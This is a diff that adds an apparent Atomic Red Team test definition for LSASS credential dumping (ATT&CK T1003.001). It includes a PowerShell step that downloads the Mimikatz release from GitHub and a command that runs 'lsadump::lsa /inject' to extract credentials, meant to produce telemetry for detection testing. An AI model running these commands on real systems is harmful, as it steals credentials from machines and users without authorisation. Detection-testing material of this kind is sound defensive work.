@@ -1,0 +1,27 @@
+attack_technique: T1003.001
+display_name: "OS Credential Dumping: LSASS Memory"
+atomic_tests:
+- name: Mimikatz LSASS Dump Simulation
+  auto_generated_guid: 0abbc53b-4a2e-44b0-b84f-6a99039f4743
+  description: |
+    Launches Mimikatz executable with lsass dump command. 
+    Mimikatz is not a requirement in this case, the cmd process creation event will have the commandline for testing.
+  supported_platforms:
+  - windows
+  input_arguments:
+    path_to_mimikatz:
+      description: Path to Mimikatz Executable
+      type: Path
+      default: PathToAtomicsFolder\mimikatz_cli\bin
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Test if executable exists
+      prereq_command: |
+        if(Test-Path "#{path_to_mimikatz}x64\mimikatz.exe") {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "#{path_to_mimikatz}"
+        Expand-Archive #{path_to_mimikatz}\mimikatz_trunk.zip
+  executor:
+    command: |
+      cmd.exe /c "#{path_to_mimikatz}\x64\mimikatz.exe lsadump::lsa /inject"
+    name: powershell
